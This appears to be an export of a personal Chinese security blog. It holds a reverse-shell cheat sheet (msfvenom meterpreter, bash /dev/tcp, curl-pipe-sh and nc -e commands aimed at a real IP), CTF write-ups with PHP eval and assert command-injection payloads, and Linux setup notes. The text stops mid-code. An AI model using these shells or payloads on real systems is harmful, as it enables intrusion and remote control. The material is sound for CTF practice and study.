<h2 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h2><p><a href="https://blog.csdn.net/weixin_44268918/article/details/129771330">(9条消息) 云服务器在CentOS7中安装msf工具_centos7安装msf_剁椒鱼头没剁椒的博客-CSDN博客</a></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">msf5 &gt; use exploit/multi/handler </span><br><span class="line"></span><br><span class="line">msf5 exploit(multi/handler) &gt; set payload php/meterpreter/reverse_tcp</span><br><span class="line"></span><br><span class="line">msf5 exploit(multi/handler) &gt; set lhost 0.0.0.0</span><br><span class="line"></span><br><span class="line">msf5 exploit(multi/handler) &gt; set lport </span><br><span class="line"></span><br><span class="line">msf5 exploit(multi/handler) &gt; exploit</span><br></pre></td></tr></table></figure>



<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">msfvenom -p php/meterpreter/reverse_tcp LHOST=101.43.182.125 LPORT=9999 R &gt; test.php</span><br></pre></td></tr></table></figure>

<h3 id="bash-反弹shell"><a href="#bash-反弹shell" class="headerlink" title="bash 反弹shell"></a>bash 反弹shell</h3><p><strong>查询当前shell命令</strong>  <strong>ls -l &#x2F;bin&#x2F;sh</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">bash -i &gt;&amp; /dev/tcp/101.43.182.125/5000 0&gt;&amp;1</span><br></pre></td></tr></table></figure>

<p>由于有的docker并没有bash命令，可以配合使用curl指令</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 1. On your machine:</span><br><span class="line">#      nc -l 1337</span><br><span class="line">#</span><br><span class="line"># 2. On the target machine:</span><br><span class="line">curl https://your-shell.com/yourip:1337 | sh</span><br></pre></td></tr></table></figure>



<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">curl https://your-shell.com/101.43.182.125:5000 | sh</span><br></pre></td></tr></table></figure>

<p>由于我的云服务器已经开起了http服务，但是我并不想在我的网站下放内容所以</p>
<p>可以使用python3 快速创建一个http 服务在某个端口</p>
<p>cd，到你想要的某个文件夹</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python3 -m http.server 端口</span><br></pre></td></tr></table></figure>

<p>在该端口下创建一个文件</p>
<h3 id="nc反弹shell"><a href="#nc反弹shell" class="headerlink" title="nc反弹shell"></a>nc反弹shell</h3><p>反向连接</p>
<p>攻击机执行：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nc -lvvp 12345</span><br></pre></td></tr></table></figure>

<p>靶机执行：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nc 101.43.182.125 5000 -e /bin/sh</span><br></pre></td></tr></table></figure>

<p>正向连接</p>
]]></content>
      <tags>
        <tag>kali</tag>
      </tags>
  </entry>
  <entry>
    <title>ctfshow_web_菜狗杯</title>
    <url>/2023/01/08/ctfshow_web_%E8%8F%9C%E7%8B%97%E6%9D%AF/</url>
    <content><![CDATA[<p>  我是菜狗</p>
 <span id="more"></span>

<h1 id="web签到"><a href="#web签到" class="headerlink" title="web签到"></a>web签到</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">eval</span>(<span class="variable">$_REQUEST</span>[<span class="variable">$_GET</span>[<span class="variable">$_POST</span>[<span class="variable">$_COOKIE</span>[<span class="string">&#x27;CTFshow-QQ群:&#x27;</span>]]]][<span class="number">6</span>][<span class="number">0</span>][<span class="number">7</span>][<span class="number">5</span>][<span class="number">8</span>][<span class="number">0</span>][<span class="number">9</span>][<span class="number">4</span>][<span class="number">4</span>]);</span><br></pre></td></tr></table></figure>

<p>加入cookie中传入<code>CTFshow-QQ群:=a</code>那么就会出现<code>$_POST[&#39;a&#39;]</code>，假如post传入的值为<code>a=b</code>，那么就会得到<code>$_GET[&#39;b&#39;]</code>，接着假如get传入<code>b=c</code>就会得到&#96;$_REQUEST[‘c’]</p>
<p><code>?b=c&amp;c[0]=1&amp;c[6][0][7][5][8][0][9][4][4]=system(&quot;ls /&quot;);</code></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">`<span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);<span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);<span class="keyword">eval</span>(<span class="variable">$_REQUEST</span>[<span class="variable">$_GET</span>[<span class="variable">$_POST</span>[<span class="variable">$_COOKIE</span>[<span class="string">&#x27;CTFshow-QQ群:&#x27;</span>]]]][<span class="number">6</span>][<span class="number">0</span>][<span class="number">7</span>][<span class="number">5</span>][<span class="number">8</span>][<span class="number">0</span>][<span class="number">9</span>][<span class="number">4</span>][<span class="number">4</span>]); `bin dev etc f1agaaa home lib media mnt proc root run sbin srv sys tmp usr <span class="keyword">var</span></span><br></pre></td></tr></table></figure>

<p><code>http://b931900e-462b-453b-9822-8631dc625e3e.challenge.ctf.show/?b=c&amp;c[0]=1&amp;c[6][0][7][5][8][0][9][4][4]=system(&quot;tac /f1a*&quot;);</code></p>
<p>ctfshow{c41273bb-5a71-44b9-9dc2-a9eaba87804d}</p>
<h1 id="我的眼里只有"><a href="#我的眼里只有" class="headerlink" title="我的眼里只有$"></a>我的眼里只有$</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">extract</span>(<span class="variable">$_POST</span>);</span><br><span class="line"><span class="keyword">eval</span>(<span class="variable">$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$_</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br></pre></td></tr></table></figure>

<p>playload:</p>
<p><code>_=a1&amp;a1=a2&amp;a2=a3&amp;a3=a4&amp;a4=a5&amp;a5=a6&amp;a6=a7&amp;a7=a8&amp;a8=a9&amp;a9=a10&amp;a10=a11&amp;a11=a12&amp;a12=a15&amp;a15=a16&amp;a16=a17&amp;a17=a18&amp;a18=a19&amp;a19=a20&amp;a20=a21&amp;a21=a22&amp;a22=a23&amp;a23=a24&amp;a24=a25&amp;a25=a26&amp;a26=a27&amp;a27=a28&amp;a28=a29&amp;a29=a30&amp;a30=a31&amp;a31=a32&amp;a32=a33&amp;a33=a34&amp;a34=a35&amp;a35=a36&amp;a36=a37&amp;a37=system(&#39;ls /&#39;);</code></p>
<p><code>bin dev etc f1agaaa home lib media mnt proc root run sbin srv sys tmp usr var &lt;?php</code></p>
<p><code>=system(&#39;cat /f*&#39;);</code></p>
<p><code>ctfshow&#123;e1b2ed6c-fbb8-4c73-876e-ec6a41950797&#125;</code></p>
<h1 id="一言既出"><a href="#一言既出" class="headerlink" title="一言既出"></a>一言既出</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>); </span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;flag.php&quot;</span>;  </span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>] == <span class="number">114514</span>)&#123;</span><br><span class="line">        <span class="title function_ invoke__">assert</span>(<span class="string">&quot;intval(<span class="subst">$_GET</span>[num])==1919810&quot;</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">&quot;一言既出，驷马难追!&quot;</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125; </span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>playload: <code>?num=114514);//</code></p>
<p>就会执行里面的内容然后注释掉了后面的全部内容，输出flag</p>
<p>解法2：<code>?num=114514%2B1805296</code></p>
<p>ctfshow{10bbb32b-baae-4704-9238-8a6df82ec55a}</p>
<h1 id="驷马难追"><a href="#驷马难追" class="headerlink" title="驷马难追"></a>驷马难追</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>); </span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;flag.php&quot;</span>; </span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>]))&#123;</span><br><span class="line">   <span class="keyword">if</span> (<span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>] == <span class="number">114514</span> &amp;&amp; <span class="title function_ invoke__">check</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>]))&#123;</span><br><span class="line">       <span class="title function_ invoke__">assert</span>(<span class="string">&quot;intval(<span class="subst">$_GET</span>[num])==1919810&quot;</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">&quot;一言既出，驷马难追!&quot;</span>);</span><br><span class="line">       <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">   &#125; </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check</span>(<span class="params"><span class="variable">$str</span></span>)</span>&#123;</span><br><span class="line"> <span class="keyword">return</span> !<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/[a-z]|\;|\(|\)/&quot;</span>,<span class="variable">$str</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>解法二依旧能用<code>?num=114514%2B1805296</code></p>
<p>ctfshow{59e5ece8-747c-41d3-a711-e1634f0b26f9}</p>
<h2 id="TapTapTap"><a href="#TapTapTap" class="headerlink" title="TapTapTap"></a>TapTapTap</h2><p>打开后是一个得分小游戏</p>
<p>检查源码在最后发现js源码，打开源码</p>
<p>base64解码后Your flag is in &#x2F;secret_path_you_do_not_know&#x2F;secretfile.txt</p>
<p>访问&#x2F;secret_path_you_do_not_know&#x2F;secretfile.txt</p>
<p>得到ctfshow{91469515-6436-482e-8d01-bb4899c3675d}</p>
<h2 id="化零为整"><a href="#化零为整" class="headerlink" title="化零为整"></a>化零为整</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;flag.php&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$result</span>=<span class="string">&#x27;&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$i</span>=<span class="number">1</span>;<span class="variable">$i</span>&lt;=<span class="title function_ invoke__">count</span>(<span class="variable">$_GET</span>);<span class="variable">$i</span>++)&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">strlen</span>(<span class="variable">$_GET</span>[<span class="variable">$i</span>])&gt;<span class="number">1</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;你太长了！！&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="variable">$result</span>=<span class="variable">$result</span>.<span class="variable">$_GET</span>[<span class="variable">$i</span>];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$result</span> ===<span class="string">&quot;大牛&quot;</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>循环输入i，中文在php里面长度是3，其实很容易想到中文的url编码就是3个</p>
<p>%E5%A4%A7%E7%89%9B</p>
<p>payload</p>
<p><code>1=%E5&amp;2=%A4&amp;3=%A7&amp;4=%E7&amp;5=%89&amp;6=%9B</code></p>
<h2 id="无一幸免"><a href="#无一幸免" class="headerlink" title="无一幸免"></a>无一幸免</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">include</span> <span class="string">&quot;flag.php&quot;</span>;</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;0&#x27;</span>]))&#123;</span><br><span class="line">  <span class="variable">$arr</span>[<span class="variable">$_GET</span>[<span class="string">&#x27;0&#x27;</span>]]=<span class="number">1</span>;</span><br><span class="line">  <span class="keyword">if</span> (<span class="variable">$arr</span>[]=<span class="number">1</span>)&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="variable">$flag</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;nonono!&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>$arr[$_GET[‘0’]]&#x3D;1;,变量arr赋值为1；始终为true,随便给0赋值</p>
<p>payload:0&#x3D;1</p>
<p>ctfshow{8b9aed50-afa2-4988-8181-89bcf3547acb}</p>
<h2 id="传说之下（雾）"><a href="#传说之下（雾）" class="headerlink" title="传说之下（雾）"></a>传说之下（雾）</h2><p>题目要求得到2077分数<br>所以查看源代码，发现js代码泄露<br>ctrl+f 搜索score这个单词是猜的，发现代码<br>由+1改为2077，ctrl+s 保存，吃一个苹果，没出来，又吃一个苹果，在控制台发现flag<br>ctfshow{Under0ph1di4n_n0!_…underrrrrta1e}</p>
<h1 id="算力超群"><a href="#算力超群" class="headerlink" title="算力超群"></a>算力超群</h1><p>不太懂</p>
<h1 id="算力升级"><a href="#算力升级" class="headerlink" title="算力升级"></a>算力升级</h1><p>不太懂</p>
]]></content>
      <categories>
        <category>ctfshow</category>
      </categories>
      <tags>
        <tag>ctfshow</tag>
      </tags>
  </entry>
  <entry>
    <title>linux问题</title>
    <url>/2023/03/17/linux/</url>
    <content><![CDATA[<p>linux使用遇见的问题</p>
   <span id="more"></span>

<p>不知道什么原因kali下无法安装openssl库于是下载了ubuntu</p>
<p>一下是遇到的一些问题</p>
<h2 id="实现Ubuntu与Windows之间的复制粘贴"><a href="#实现Ubuntu与Windows之间的复制粘贴" class="headerlink" title="实现Ubuntu与Windows之间的复制粘贴"></a>实现Ubuntu与Windows之间的复制粘贴</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo apt-get autoremove open-vm-tools	//卸载已有的工具</span><br><span class="line">sudo apt-get install open-vm-tools		//安装工具open-vm-tools</span><br><span class="line">sudo apt-get install open-vm-tools-desktop  //安装open-vm-tools-desktop</span><br><span class="line">reboot       //重启Ubuntu系统</span><br></pre></td></tr></table></figure>

<p>安装基本软件</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">使用命令sudo apt install build-essential，该命令将安装一堆新包，包括gcc，g ++和make</span><br></pre></td></tr></table></figure>



<h2 id="安装-openssl库"><a href="#安装-openssl库" class="headerlink" title="安装 openssl库"></a>安装 openssl库</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">apt-get install libssl-dev</span><br></pre></td></tr></table></figure>



<p>开启ubuntu的大门？</p>
<h2 id="centos7"><a href="#centos7" class="headerlink" title="centos7"></a>centos7</h2><p>安装图形化页面</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">yum groupinstall &quot;X Window System&quot;</span><br><span class="line">yum groupinstall -y &quot;GNOME Desktop&quot;</span><br><span class="line">su</span><br><span class="line">init 5  //进入图形化页面</span><br></pre></td></tr></table></figure>

<p>安装apaech服务</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">rpm -qa httpd   #检验有没有httpd</span><br><span class="line">yum install httpd* -y   #安装</span><br><span class="line">systemctl start httpd.service #启动</span><br><span class="line">systemctl stop httpd.service #停止服务</span><br><span class="line">systemctl status httpd.service #查看状态</span><br></pre></td></tr></table></figure>

<p>安装mysql</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">wget -i -c http://dev.mysql.com/get/mysql57-community-release-el7-10.noarch.rpm</span><br></pre></td></tr></table></figure>



<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">yum -y install mysql57-community-release-el7-10.noarch.rpm</span><br></pre></td></tr></table></figure>

<p>安装mysql服务好像会报错，下面是报错内容</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">warning: /var/cache/yum/x86_64/7/mysql57-community/packages/mysql-community-libs-compat-5.7.41-1.el7.x86_64.rpm: Header V4 RSA/SHA256 Signature, key ID 3a79bd29: NOKEY</span><br><span class="line">Retrieving key from file:///etc/pki/rpm-gpg/RPM-GPG-KEY-mysql</span><br><span class="line">The GPG keys listed for the &quot;MySQL 5.7 Community Server&quot; repository are already installed but they are not correct for this package.</span><br><span class="line">Check that the correct key URLs are configured for this repository.</span><br><span class="line"> Failing package is: mysql-community-libs-compat-5.7.41-1.el7.x86_64</span><br><span class="line"> GPG Keys are configured as: file:///etc/pki/rpm-gpg/RPM-GPG-KEY-mysql</span><br></pre></td></tr></table></figure>

<p>找到解决方法</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">rpm --import https://repo.mysql.com/RPM-GPG-KEY-mysql-2022  //先执行这个</span><br><span class="line">yum -y install mysql-community-server  ///再安装</span><br></pre></td></tr></table></figure>

<p>安装完毕，开始使用</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">systemctl start  mysqld.service  #打开mysql</span><br><span class="line">systemctl status mysqld.service   #检查状态</span><br><span class="line">grep &quot;password&quot; /var/log/mysqld.log  //查找暂时root密码</span><br><span class="line">mysql -uroot -p  #登录密码</span><br><span class="line">ALTER USER &#x27;root&#x27;@&#x27;localhost&#x27; IDENTIFIED BY &#x27;new password&#x27;;  #修改密码需要字符大小写数字</span><br></pre></td></tr></table></figure>

<p>xshell传输文件发现没有权限 ，赋予权限即可传输成功</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cd /var/www</span><br><span class="line">chmod 777 html</span><br></pre></td></tr></table></figure>

<h3 id="nginx"><a href="#nginx" class="headerlink" title="nginx"></a>nginx</h3><p>开启，关机，重启。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">systemctl start nginx</span><br><span class="line">systemctl stop nginx</span><br><span class="line">systemctl restart nginx</span><br></pre></td></tr></table></figure>

<h2 id="查看端口"><a href="#查看端口" class="headerlink" title="查看端口"></a>查看端口</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">netstat -anp</span><br><span class="line">或者</span><br><span class="line">netstat -tln</span><br></pre></td></tr></table></figure>

<p>bind to :::9999: Address already in use. QUITTING.</p>
<p>解决方法</p>
<p><code>1.找到占用进程： netstat -nap | grep 端口</code></p>
<p>kill pid</p>
]]></content>
  </entry>
  <entry>
    <title>nss1</title>
    <url>/2023/04/14/nss1/</url>
    <content><![CDATA[<p>  部分nss的题</p>
  <span id="more"></span>

<h2 id="SWPUCTF-2021-新生赛-jicao"><a href="#SWPUCTF-2021-新生赛-jicao" class="headerlink" title="[SWPUCTF 2021 新生赛]jicao"></a>[SWPUCTF 2021 新生赛]jicao</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="string">&#x27;index.php&#x27;</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"><span class="variable">$id</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;id&#x27;</span>];</span><br><span class="line"><span class="variable">$json</span>=<span class="title function_ invoke__">json_decode</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;json&#x27;</span>],<span class="literal">true</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$id</span>==<span class="string">&quot;wllmNB&quot;</span>&amp;&amp;<span class="variable">$json</span>[<span class="string">&#x27;x&#x27;</span>]==<span class="string">&quot;wllm&quot;</span>)</span><br><span class="line">&#123;<span class="keyword">echo</span> <span class="variable">$flag</span>;&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p><a href="https://www.php.net/manual/zh/function.json-encode.php">PHP: json_encode - Manual</a></p>
<p>payload:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/?json=&#123;&quot;x&quot;:&quot;wllm&quot;&#125;</span><br><span class="line">post id=wllmNB</span><br></pre></td></tr></table></figure>

<h2 id="NISACTF-2022-easyssrf"><a href="#NISACTF-2022-easyssrf" class="headerlink" title="[NISACTF 2022]easyssrf"></a>[NISACTF 2022]easyssrf</h2><p>打开后随便curl一下试试</p>
<p><code>http://127.0.0.1/flag</code></p>
<p>看到：都说了这里看不了flag。。但是可以看看提示文件：&#x2F;fl4g</p>
<p>找不到打不开</p>
<p>换成php伪协议</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">file:///fl4g</span><br></pre></td></tr></table></figure>

<p>三个杠意思根目录下的fl4g</p>
<p>出现了</p>
<p>你应该看看除了index.php，是不是还有个ha1x1ux1u.php</p>
<p>意思是在ha1x1ux1u.php与index.php同一目录，访问一下</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&quot;file&quot;</span>];</span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">stristr</span>(<span class="variable">$file</span>, <span class="string">&quot;file&quot;</span>))&#123;</span><br><span class="line">  <span class="keyword">die</span>(<span class="string">&quot;你败了.&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//flag in /flag</span></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$file</span>);</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?file=/flag</span><br></pre></td></tr></table></figure>

<p>既然提示在根目录下叫flag,也懒得用伪协议找了</p>
<p>NSSCTF{0c36f2e6-8b20-4fa3-ab78-9ee0e0725d40}</p>
<h2 id="ez-unserialize"><a href="#ez-unserialize" class="headerlink" title="ez_unserialize"></a>ez_unserialize</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">error_reporting(0);</span><br><span class="line">show_source(&quot;cl45s.php&quot;);</span><br><span class="line"></span><br><span class="line">class wllm&#123;</span><br><span class="line"></span><br><span class="line">    public $admin;</span><br><span class="line">    public $passwd;</span><br><span class="line"></span><br><span class="line">    public function __construct()&#123;</span><br><span class="line">        $this-&gt;admin =&quot;user&quot;;</span><br><span class="line">        $this-&gt;passwd = &quot;123456&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">        public function __destruct()&#123;</span><br><span class="line">        if($this-&gt;admin === &quot;admin&quot; &amp;&amp; $this-&gt;passwd === &quot;ctf&quot;)&#123;</span><br><span class="line">            include(&quot;flag.php&quot;);</span><br><span class="line">            echo $flag;</span><br><span class="line">        &#125;else&#123;</span><br><span class="line">            echo $this-&gt;admin;</span><br><span class="line">            echo $this-&gt;passwd;</span><br><span class="line">            echo &quot;Just a bit more!&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$p = $_GET[&#x27;p&#x27;];</span><br><span class="line">unserialize($p)</span><br></pre></td></tr></table></figure>

<p>poc:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class wllm</span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">    public $admin=&#x27;admin&#x27;;</span><br><span class="line">    public $passwd=&#x27;ctf&#x27;;</span><br><span class="line">&#125;</span><br><span class="line">$a=new wllm();</span><br><span class="line">echo serialize($a);</span><br></pre></td></tr></table></figure>

<p>先执行__construct</p>
<p>后赋值，加深一下印象</p>
<p>NSSCTF{60cf6a40-176b-4555-8001-d99a70d1385e}</p>
<h2 id="HUBUCTF-2022-新生赛-checkin"><a href="#HUBUCTF-2022-新生赛-checkin" class="headerlink" title="[HUBUCTF 2022 新生赛]checkin"></a>[HUBUCTF 2022 新生赛]checkin</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$username</span>  = <span class="string">&quot;this_is_secret&quot;</span>; </span><br><span class="line"><span class="variable">$password</span>  = <span class="string">&quot;this_is_not_known_to_you&quot;</span>; </span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);<span class="comment">//here I changed those two </span></span><br><span class="line"><span class="variable">$info</span> = <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;info&#x27;</span>])? <span class="variable">$_GET</span>[<span class="string">&#x27;info&#x27;</span>]: <span class="string">&quot;&quot;</span> ;</span><br><span class="line"><span class="variable">$data_unserialize</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$info</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$data_unserialize</span>[<span class="string">&#x27;username&#x27;</span>]==<span class="variable">$username</span>&amp;&amp;<span class="variable">$data_unserialize</span>[<span class="string">&#x27;password&#x27;</span>]==<span class="variable">$password</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;username or password error!&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>看到这一行<code>include(&quot;flag.php&quot;);//here I changed those two</code></p>
<p>所以直接比较不了，所以考察了一个php特性，</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">if(null==0)   true</span><br><span class="line">if(flase==0)   true</span><br><span class="line">if(ture==&#x27;非null&#x27;)  true</span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="variable">$a</span> = [</span><br><span class="line"><span class="string">&#x27;username&#x27;</span> =&gt; <span class="literal">true</span>,</span><br><span class="line"><span class="string">&#x27;password&#x27;</span> =&gt; <span class="literal">true</span></span><br><span class="line">];</span><br><span class="line"><span class="variable">$info</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$info</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">a:2:&#123;s:8:&quot;username&quot;;b:1;s:8:&quot;password&quot;;b:1;&#125;</span><br></pre></td></tr></table></figure>

<h2 id="鹤城杯-2021-EasyP"><a href="#鹤城杯-2021-EasyP" class="headerlink" title="[鹤城杯 2021]EasyP"></a>[鹤城杯 2021]EasyP</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;utils.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;guess&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$guess</span> = (<span class="keyword">string</span>) <span class="variable">$_POST</span>[<span class="string">&#x27;guess&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$guess</span> === <span class="variable">$secret</span>) &#123;</span><br><span class="line">        <span class="variable">$message</span> = <span class="string">&#x27;Congratulations! The flag is: &#x27;</span> . <span class="variable">$flag</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$message</span> = <span class="string">&#x27;Wrong. Try Again&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/utils\.php\/*$/i&#x27;</span>, <span class="variable">$_SERVER</span>[<span class="string">&#x27;PHP_SELF&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">exit</span>(<span class="string">&quot;hacker :)&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/show_source/&#x27;</span>, <span class="variable">$_SERVER</span>[<span class="string">&#x27;REQUEST_URI&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">exit</span>(<span class="string">&quot;hacker :)&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;show_source&#x27;</span>])) &#123;</span><br><span class="line">    <span class="title function_ 